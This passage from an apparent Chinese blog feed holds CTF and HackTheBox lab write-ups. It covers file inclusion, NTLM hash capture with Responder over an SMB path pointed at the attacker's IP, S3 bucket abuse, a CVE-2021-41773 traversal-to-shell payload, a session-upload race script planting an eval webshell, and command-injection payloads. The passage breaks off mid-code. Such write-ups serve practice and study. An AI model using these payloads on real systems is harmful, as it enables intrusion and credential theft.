alt="image-20230330154052951"></p><p>考点挺多的啊</p><p>老样子还是能ping通</p><p><img src="../images/image-20230403154945808.png" alt="image-20230403154945808"></p><p>但是就是端口扫描太慢了</p><p>这里就拿一下别人扫出的端口号</p><p>nmap的一些指令的用法</p><p>借用一下，-sS 使用 SYN 扫描，因为 TCP 扫描会经历三次握手耗费大量时间，-Pn 是禁 ping 主机，防止被防火墙过滤而漏扫，但是我们只有一个主机，所以没什么影响，-n 不解析域名，-open 只输出开放端口，结果扫描到 3 个端口，而且注意 5985 端口扫描出的服务也有所不同</p><p><img src="../images/image-20230403160224371.png" alt="image-20230403160224371"></p><p><strong>这个 wsman 全称是 Windows Remote Managemen(WS_Management) ,如果使用 Win7 或者Windows 2003 Server以上版本的操作系统，微软在系统中已经自带了支持WSMAN 的管理客户端，叫做 winrm，它可以提供远程 powershell 管理服务，听起来就比较危险</strong></p><p>扫到了这几个端口号，但是去访问<strong>80</strong>的时候却报错，然后重定向到了另一个域名处</p><p><img src="../images/image-20230403160317545.png" alt="image-20230403160317545"></p><p>5985端口也是一样(但是没有重定向)</p><p><img src="../images/image-20230403160622798.png" alt="image-20230403160622798"></p><p>7680端口也是这样，没有重定向</p><p><img src="../images/image-20230403160558935.png" alt=""></p><p>我们知道如果想通过域名访问一个网站的话，是需要进行 dns 解析的，我们直接输入 IP 地址发现被重定向到了 <code>unika.htb</code> 这个域名，但是这个域名没有办法解析到对应的 IP 地址，所以我们需要通过修改 <code>hosts</code> 文件来确定 IP 地址</p><p><strong>修改host进入网址</strong></p><p><img src="../images/image-20230403161118887.png" alt="image-20230403161118887"></p><p>添加后，就可以成功进入网址了</p><p><img src="../images/image-20230403161144380.png" alt="image-20230403161144380"></p><p>再次访问，出现页面，这个网站是通过虚拟主机搭建的，也就是多个网站搭建在一台服务器上，一般现实环境中是不能通过虚拟主机的 IP 直接访问的，而是通过 <code>A 记录</code>(把域名解析到一个IP地址)或 <code>CNAME 记录</code> (把域名解析到另外一个域名)解析出域名后，再进行下一次域名解析来访问</p><p><strong>查看网站有哪些功能</strong></p><p>查看网站功能<br>测试 web 应用程序可以重点关注交互功能，我们能控制哪些输入，又如何被后端处理，会不会以及怎么输出? 静态的网站基本上不会有漏洞的</p><p>点了点网站，也是很常见的公司产品官网(?不知道怎么分类，就是静态页面为主)，只有一个留言功能和一个语言切换功能有数据包请求，剩下都是由前端完成资源锚点跳转的</p><p>请求这两个功能分别是两个 html 页面的请求，但是都是跳转到首页最上方</p><p><strong>简单来说就是这里的话只有点击切换语言和发送评论功能才会有跳转，其他都是静态页面</strong></p><p><img src="../images/image-20230403161618815.png" alt="image-20230403161618815"></p><p>点击切换语言的时候，会有这个东西出现，感觉有点<strong>文件包含</strong>的意思</p><p><strong>探测漏洞—文件包含</strong></p><p>到这里有一个 <code>page</code> 参数，输入文件名，那么这个地方比较大可能存在的漏洞就是文件包含漏洞，我们在初级靶场也接触过，测试一下？</p><p>随便输入，发现报错返回了路径，使用的 <code>xampp</code>，一种比较常用的一键式集成环境搭建的网站，默认是将脚本文件放到 <code>xampp/htdocs</code> 目录下运行</p><p><img src="../images/image-20230403162422210.png" alt="image-20230403162422210"></p><p>很明显的windows环境 出现了  <code>C://</code></p><p>有什么特殊的敏感文件吗? 我们可以尝试查看 <code>hosts</code> 文件   <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">敏感文件</a></p><p><img src="../images/image-20230403163615076.png" alt="image-20230403163615076"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>直接用盘符也行</p><p><img src="../images/image-20230403163704273.png" alt="image-20230403163704273"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=C://windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>那么如何进一步利用呢？两种思路，一是写入或包含远程后门文件，然后连接，还有是继续信息收集 <code>windows</code> 系统的账号密码信息，进行登录</p><p>我们测试一下远程文件包含，我们知道远程文件包含还需要两个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include、allow_url_fopen 为 ON</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403164006812.png" alt="image-20230403164006812"></p><p>发现没开，所以说明远程文件包含也用不了了</p><p>那么咱就继续进行信息收集去</p><p>我们知道这个⽹⻚容易受到⽂件包含漏洞的影响，并且在 Windows 机器上提供服务。因此，存在在我们的攻击者⼯作站上包含⽂件的可 能性。如果我们选择像 <strong>SMB</strong> 这样的协议，Windows 将尝试对我们的机器进⾏⾝份验证，并且我们可以捕获NetNTLMv2.</p><p><strong>利用 SMB 窃取 NTLM hash</strong></p><p><img src="../images/image-20230403201415201.png" alt="image-20230403201415201"></p><p><img src="../images/image-20230403201426613.png" alt="image-20230403201426613"></p><p><img src="../images/image-20230403201445815.png" alt="image-20230403201445815"></p><p><strong>SMB 协议支持 NTLM 和 LM 加密，我们通过恶意程序监听，在远程主机访问我们的 SMB 服务时，因为要进行身份验证，会发送相关信息，我们就可以获取目标主机的 hash 值，这个是为了账号密码的安全性，一般都不进行明文验证，而是使用摘要值进行比对，这样就给了我们可乘之机，不需要知道正确的账号密码，只要摘要值比对成功就可以登录</strong></p><p><strong>下载工具，使用其进行监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/lgandx/Responder </span><br></pre></td></tr></table></figure><p>确认是否支持 SMB 请求</p><p><img src="../images/image-20230403202210015.png" alt="image-20230403202210015"></p><p>监听 <code>tun0</code> ,之前有一次靶机提到过，该 IP 是和目标机器一个网络下的 10 段 IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I tun0 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403202438515.png" alt="image-20230403202438515"></p><p><img src="../images/image-20230403202457127.png" alt="image-20230403202457127"></p><p>我们使用 <code>curl</code> 命令来请求 <code>url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://unika.htb/index.php?page=//10.129.158.196/csd </span><br></pre></td></tr></table></figure><p>这里的话要拿<code>tun0</code>的ip地址</p><p>不是拿题目的ip地址</p><p>我们发现成功接收到服务器的的 <code>NTLM</code> 值,一般是第一次请求才会发送，然后会保存到本地，下次就不会再发送了</p><p>接下来不写了   弹不成功，获得不了请求</p><p><strong>wp</strong></p><p><a href="https://blog.csdn.net/qq_40927195/article/details/124418613?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168050613316800226520463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168050613316800226520463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124418613-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=responder%20htb&amp;spm=1018.2226.3001.4187">文章1</a></p><p><a href="blob:https://app.hackthebox.com/77561ee0-b632-4b11-820a-27746092a7a3">文章2</a>    ——&gt;   可能打不开   这是在hackthebox里面的官方文档，本地的<code>1.pdf</code>是中文翻译过来的</p><h2 id="three"><a href="#three" class="headerlink" title="three"></a>three</h2><p>考点</p><p><img src="../images/image-20230404202036676.png" alt="image-20230404202036676"></p><p>还是老样子，先ping一下</p><p><img src="../images/image-20230404202059303.png" alt="image-20230404202059303"></p><p>接下来就行端口扫描</p><p><img src="../images/image-20230404202338133.png" alt="image-20230404202338133"></p><p>扫到了两个端口</p><p>扫描发现开放 22 和 80 两个端口，22 是 <code>ssh</code> 服务，登录分为账号密码登录和<a href="https://so.csdn.net/so/search?q=公钥&amp;spm=1001.2101.3001.7020">公钥</a>登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip</span><br><span class="line">ssh ip</span><br></pre></td></tr></table></figure><p>没有登录成功，看80端口</p><p>是一个乐队的官网，apache2.4.29 、linux 系统、php ，功能有搜索，买票，联系我们，不过都只是做个页面，<strong>没有实际的请求交互</strong></p><p>尝试目录爬取和爆破，没有什么有用的信息…</p><p>Email: <strong>mail@thetoppers.htb</strong> 看到了邮箱，然后把靶机 ip 和域名进行绑定，然后进行子域名爆破，不要问为什么这么做，学着点就行了</p><p><img src="../images/image-20230404210616587.png" alt="image-20230404210616587"></p><p>发现只有这个域名有用，但我们直接访问这个域名的时候却没有打开这个网址，应该就是没有配置hosts的原因，和上面的<code>Responder</code>是一个考点</p><p>修改后是直接能访问这个网址的</p><p>子域名爆破，这个问题，因为我们现在只能解析靶机IP和它对应的域名，子域名如何解析？即使是同一个IP的子域名，在没有修改 <code>hosts</code> 文件时也是无法访问的，工具又是如何判断爆破的子域名存在呢？</p><p>使用 <code>gobuster</code> 爆破，字典也是从别的工具里借用的，但是字典太大了，就提前结束了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/wordlists/domain_dic.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p> 反正就是找到了一个子域名</p><p><code>s3.thetoppers.htb</code></p><p>vhost 的主要功能是枚举某个服务上部署的所有虚拟主机，其原理是通过构造 HTTP 请求头，将字典中的域名设置到 HTTP 请求头到 HOST 字段，然后通过 IP 请求网站，如果是该域名的虚拟主机，那么请求会返回该域名下的网站内容，如果不是，则返回通过 IP 访问获得的资源而非域名下的资源</p><p>然后接下来还是修改hosts</p><p><img src="../images/image-20230404221641973.png" alt="image-20230404221641973"></p><p><img src="../images/image-20230404221721024.png" alt="image-20230404221721024"></p><p>成功了</p><p><img src="../images/image-20230404221802636.png" alt="image-20230404221802636"></p><p>使用的 <code>hypercorn</code> 这是一个 <code>ASGI</code> 服务器，启用后监听8000端口云云，不用了解太多</p><p>ASGI（异步服务器网关接口）是<a href="https://so.csdn.net/so/search?q=WSGI&amp;spm=1001.2101.3001.7020">WSGI</a>的精神继承者，旨在在具有异步功能的Python Web服务器，框架和应用程序之间提供标准接口</p><p><strong>AWS S3 拿shell</strong></p><p><code>s3</code> 👉 <code>AWS S3</code> 全名是 <code>Amazon Simple Storage Service</code> ，简便的对象存储服务，存储的数据类似键值对的形式，就是对象名：数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install awscli       // 安装工具 </span><br><span class="line">aws configure            // 配置</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091400477.png" alt="image-20230406091400477"></p><p>前两项配置是用户凭证，通过什么身份连接到 <code>AWS</code> 存储库，第三个是区域信息，第四个是输出格式，为什么都是 <code>temp</code> 我也不懂，可能是设置的</p><p>通过工具访问并执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091950627.png" alt="image-20230406091950627"></p><p>发现存在.htaccess，文件上传对这个很熟悉，然后我们就尝试进行文件上传看看‘</p><p><img src="../images/image-20230406092738942.png" alt="image-20230406092738942"></p><p>上传成功 成功获取 <code>webshell</code> 权限 </p><p>这里没复现成功 。。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Meow-telnet&quot;&gt;&lt;a href=&quot;#Meow-telnet&quot; class=&quot;headerlink&quot; title=&quot;Meow(telnet)&quot;&gt;&lt;/a&gt;Meow(telnet)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;../images/image-202303</summary>
      
    
    
    
    
    <category term="htb 渗透" scheme="https://ke1nys.github.io/tags/htb-%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-CMS刷题记录</title>
    <link href="https://ke1nys.github.io/posts/746c3a8a.html"/>
    <id>https://ke1nys.github.io/posts/746c3a8a.html</id>
    <published>2023-03-27T12:23:13.000Z</published>
    <updated>2023-04-06T06:48:36.142Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>nssctf-web-刷题记录</title>
    <link href="https://ke1nys.github.io/posts/92a60629.html"/>
    <id>https://ke1nys.github.io/posts/92a60629.html</id>
    <published>2023-03-23T11:35:27.000Z</published>
    <updated>2023-04-06T06:48:36.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p><strong>这里的考点是put方法</strong></p><p>题目</p><p><img src="../images/image-20230323195811854.png" alt="image-20230323195811854"></p><p>就这点东西，然后我们去信息收集，扫一下目录啥的，然后啥也没扫到</p><p>最后是利用<strong>nikto</strong>这个工具才发现的考点   <a href="https://zhuanlan.zhihu.com/p/124246499">nikto工具的介绍</a></p><p><img src="../images/image-20230323200125587.png" alt="image-20230323200125587"></p><p>发现可以使用put方法，这个方法就是可以直接写内容到自定义的文件里</p><p><img src="../images/image-20230323200345772.png" alt="image-20230323200345772"></p><p>这里就发现1.php创建成功了</p><p>然后就成功写入shell，然后就直接去rce就行了</p><p><strong>学到了个新的知识点了</strong></p><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>考点</p><p><strong>CVE-2021-41773</strong></p><p><a href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现</a></p><p><img src="../images/image-20230324192225432.png" alt="image-20230324192225432"></p><p><strong>payload</strong></p><p>bp  —&gt;  POST发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230324192317206.png" alt="image-20230324192317206"></p><p>因为这里的话flag藏的有点深，直接查找不出来所以就得利用grep命令</p><h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>考点</p><p><img src="../images/image-20230324192432327.png" alt="image-20230324192432327"></p><p>这里的话题目的url给了url/index.php?file=  然后就猜一下伪协议，然后拿到源码，然后直接rce就行，在env里</p><h2 id="NSSRound-8-Basic-MyPage"><a href="#NSSRound-8-Basic-MyPage" class="headerlink" title="[NSSRound#8 Basic]MyPage"></a>[NSSRound#8 Basic]MyPage</h2><p>考点</p><p><img src="../images/image-20230324193048319.png" alt="image-20230324193048319"></p><p>题目</p><p><img src="../images/image-20230327172616273.png" alt="image-20230327172616273"></p><p>还是文件包含(只不过这里的话是直接用php为协议是用不了的)</p><p><img src="../images/image-20230327172750597.png" alt="image-20230327172750597"></p><p><img src="../images/image-20230327175508778.png" alt="image-20230327175508778"></p><p><strong>还有一个是pearcmd文件包含</strong></p><p>上面大概就是文件包含的思路了</p><p><strong>方法1</strong></p><p>session文件包含(show里面也有)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://43.143.7.127:28242/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cat index.php&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><p>用上面的脚本把题目源码给整出来了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里就涉及到一个新的东西叫  <code>include_once</code></p><p><img src="../images/image-20230327211231920.png" alt="image-20230327211231920"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/cwd/index.php</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-7-Team-ec-RCE"><a href="#NSSRound-7-Team-ec-RCE" class="headerlink" title="[NSSRound#7 Team]ec_RCE"></a>[NSSRound#7 Team]ec_RCE</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By 探姬 --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>就是靠个符号分隔符的含义</strong>      &amp;      &amp;&amp;     ||     ；</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=;&amp;data=<span class="string">&#x27;cat /flag&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p><strong>考点</strong></p><p><img src="../images/image-20230327212719856.png" alt="image-20230327212719856"></p><p><img src="../images/image-20230327213330424.png" alt="image-20230327213330424"></p><p>源码给提示，就是给了注入点了，然后直接去注入就行了</p><p><a href="https://www.cnblogs.com/z2n3/p/16127279.html">这篇文章可以</a></p><p>就是对这道题讲解的非常详细</p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>考点</p><p><img src="../images/image-20230327213500110.png" alt="image-20230327213500110"></p><p>题目</p><p><img src="../images/image-20230327221113520.png" alt="image-20230327221113520"></p><p>这里就是给你查出源码，然后给你自己审计的过程</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的触发点就是<code>file_get_contents()</code>，这个会触发phar反序列化</p><p>那么这里的话就只需要绕过wakeup就行了</p><p><strong>生成phar文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 